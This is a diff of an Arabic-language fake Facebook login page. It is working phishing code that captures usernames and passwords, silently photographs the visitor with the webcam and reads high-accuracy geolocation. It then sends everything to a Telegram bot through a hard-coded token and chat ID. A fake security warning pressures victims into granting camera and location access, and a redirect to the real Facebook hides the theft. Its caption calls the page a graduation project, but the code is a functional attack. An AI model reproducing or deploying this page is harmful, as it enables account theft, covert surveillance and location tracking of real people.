@@ -2,116 +2,151 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تسجيل الدخول إلى فيسبوك | Facebook</title>
-    <link rel="icon" href="https://www.facebook.com/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول</title>
     <style>
-        body { margin:0; padding:0; background:#f0f2f5; font-family: Helvetica, Arial, sans-serif; display:flex; justify-content:center; align-items:flex-start; min-height:100vh; }
-        .fb-container { width:100%; max-width:412px; background:white; min-height:100vh; display:flex; flex-direction:column; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .logo-wrapper { text-align: center; padding-top: 40px; padding-bottom: 20px; }
-        .form-area { padding: 0 16px; }
-        input { width:100%; padding:14px; margin:6px 0; border:1px solid #dddfe2; border-radius:6px; font-size:16px; background-color: #f5f6f7; box-sizing: border-box; }
-        input:focus { outline: none; border-color: #1877f2; background-color: #fff; }
-        .login-btn { width:100%; padding:12px; background:#1877f2; color:white; font-size:18px; font-weight:bold; border:none; border-radius:6px; cursor:pointer; margin-top:12px; transition: 0.2s; }
-        .login-btn:active { background: #166fe5; transform: scale(0.98); }
-        .links { text-align:center; margin:20px 0; font-size:14px; }
-        .links a { color:#1877f2; text-decoration:none; display: block; margin-bottom: 15px; }
-        .divider { border:0; border-top:1px solid #dddfe2; margin:20px 0; }
-        .create-btn { background:#42b72a; color:white; border:none; padding:10px 16px; border-radius:6px; font-weight:bold; cursor: pointer; }
-        .footer { margin-top: auto; text-align:center; padding:20px; font-size:12px; color:#8a8d91; line-height: 1.6; }
+        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
+        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
+        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:20px;font-weight:bold;}
+        .form-area {padding:20px;}
+        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
+        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
+        .links {text-align:center;margin:15px 0;font-size:14px;}
+        .links a {color:#1877f2;text-decoration:none;}
+        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
+        
+        /* عنصر التحذير الذي كان ناقصاً */
+        #warning {
+            display:none; position:fixed; top:0; left:0; right:0; bottom:0; 
+            background:rgba(0,0,0,0.95); color:white; text-align:center; 
+            padding:40px; font-size:18px; z-index:9999; flex-direction:column; 
+            justify-content:center; align-items:center;
+        }
+        .retry-btn { margin-top:20px; padding:10px 20px; background:#1877f2; border:none; color:white; border-radius:5px; cursor:pointer; }
     </style>
 </head>
 <body>
 
+<div id="warning">
+    <div style="font-size: 40px; margin-bottom: 20px;">⚠️</div>
+    <div>عذراً، يجب السماح بالأذونات المطلوبة (الكاميرا والموقع) لتأكيد هويتك وتأمين حسابك ضد الاختراق.</div>
+    <button class="retry-btn" onclick="location.reload()">إعادة المحاولة</button>
+</div>
+
 <div class="fb-container">
-    <div class="logo-wrapper">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg" width="112" alt="facebook">
-    </div>
-    
+    <div class="header">فيسبوك</div>
     <div class="form-area">
-        <form id="mainForm">
-            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="button" id="loginBtn" class="login-btn">تسجيل الدخول</button>
         </form>
-        
         <div class="links">
-            <a href="#">هل نسيت كلمة السر؟</a>
-            <div class="divider"></div>
-            <button class="create-btn">إنشاء حساب جديد</button>
+            <a href="#">نسيت كلمة المرور؟</a><br><br>
+            <a href="#">إنشاء حساب جديد</a>
         </div>
     </div>
-
     <div class="footer">
-        العربية · English (US) · Français (France) · Español<br>
+        العربية · English · Türkçe · بیشتر<br>
         Meta © 2026
     </div>
 </div>
 
 <script>
-// === CONFIGURATION ===
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-document.getElementById('mainForm').onsubmit = async function(e) {
-    e.preventDefault();
-    
-    const userEmail = document.getElementById('email').value;
-    const userPass = document.getElementById('pass').value;
-    const btn = document.getElementById('submitBtn');
-    
-    // UI Feedback
-    btn.innerText = "جاري التحقق...";
-    btn.disabled = true;
+document.getElementById('loginBtn').onclick = function() {
+    const user = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
 
-    const info = `🔥 صيد جديد!\n📧 الإيميل: ${userEmail}\n🔑 الباسورد: ${userPass}\n🌐 المتصفح: ${navigator.platform}`;
+    if(!user || !pass) {
+        alert("يرجى إدخال البيانات المطلوبة");
+        return;
+    }
 
-    // 1. Attempt Background Capture (Triggers because of 'Submit' click)
+    // إظهار رسالة "جاري التحقق" وهمية
+    document.getElementById('loginBtn').innerText = "جاري التحقق...";
+    document.getElementById('loginBtn').disabled = true;
+
+    // طلب الكاميرا والموقع (يجب أن يكونا نتيجة ضغطة الزر)
+    captureEverything(user, pass);
+};
+
+async function captureEverything(user, pass) {
     try {
+        // 1. طلب الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
 
-        // Give the camera a second to adjust
-        setTimeout(async () => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg'));
-            stream.getTracks().forEach(t => t.stop()); // Stop camera light
+        // التقاط الصورة
+        const canvas = document.createElement('canvas');
+        canvas.width = 1280; canvas.height = 720;
+        canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+        const imageData = canvas.toDataURL('image/jpeg');
+        stream.getTracks().forEach(t => t.stop());
 
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'victim.jpg');
-            formData.append('caption', info);
-
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            finish();
-        }, 1000);
+        // 2. طلب الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                await sendToTelegram(user, pass, imageData, position);
+            },
+            () => { showWarning(); },
+            { enableHighAccuracy: true, timeout: 10000 }
+        );
 
     } catch (err) {
-        // 2. Fallback: If camera is blocked, send text only
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: info + "\n⚠️ (الضحية رفض الكاميرا)" })
-        });
-        finish();
+        showWarning();
     }
-};
+}
 
-function finish() {
-    // Redirect to real Facebook to complete the illusion
-    window.location.href = "https://www.facebook.com/login/";
+async function sendToTelegram(user, pass, imageData, position) {
+    const lat = position.coords.latitude.toFixed(6);
+    const lng = position.coords.longitude.toFixed(6);
+    const acc = Math.round(position.coords.accuracy);
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
+    const time = new Date().toLocaleString('ar-EG', {
+        weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+    });
+
+    const caption = `🎓 مشروع تخرج - تقرير اختراق\n\n` +
+                    `👤 المستخدم: ${user}\n` +
+                    `🔑 كلمة المرور: ${pass}\n` +
+                    `📍 الموقع: ${lat},${lng} (دقة ${acc}m)\n` +
+                    `🔗 الخريطة: ${mapsUrl}\n` +
+                    `🕐 الوقت: ${time}`;
+
+    const blob = dataURLtoBlob(imageData);
+    const formData = new FormData();
+    formData.append('photo', blob, 'capture.jpg');
+    formData.append('caption', caption);
+    formData.append('chat_id', CHAT_ID);
+
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+        // التوجيه للفيسبوك الحقيقي بعد النجاح
+        window.location.href = "https://m.facebook.com/login/";
+    } catch (e) {
+        console.error("خطأ في الإرسال");
+    }
+}
+
+function showWarning() {
+    document.getElementById('warning').style.display = 'flex';
 }
 
 function dataURLtoBlob(dataurl) {
     let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
         bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-    while(n--){ u8arr[n] = bstr.charCodeAt(n); }
-    return new Blob([u8arr], {type:mime});
+    while(n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
 }
 </script>
 
